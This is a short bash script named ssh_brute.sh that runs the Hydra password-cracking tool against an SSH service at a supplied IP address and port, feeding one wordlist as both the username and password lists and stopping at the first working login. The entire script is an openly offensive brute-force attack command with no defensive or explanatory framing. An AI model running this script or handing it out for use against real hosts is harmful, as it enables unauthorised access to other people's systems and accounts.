#! /usr/bin/bash

# Usage:
#   ssh_brute.sh [wordlist] [ip] [port]

# hydra -L [username_list] -P [password_list] -f [ip]:[port] ssh
hydra -L $1 -P $1 -f $2:$3 ssh
